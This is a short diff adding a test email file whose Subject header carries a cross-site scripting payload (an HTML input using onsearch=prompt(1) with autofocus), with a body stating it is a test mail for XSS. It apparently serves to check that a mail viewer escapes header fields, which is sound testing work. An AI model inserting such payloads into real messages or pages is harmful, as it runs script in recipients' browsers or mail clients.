@@ -1,0 +1,7 @@
+From: Renee Cote <amos@globalnetconsulting.com>
+To: theresa.staab@enron.com, e-mail <.sandy@enron.com>, 
+Subject: <input type="search" onsearch=prompt(1) autofocus>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
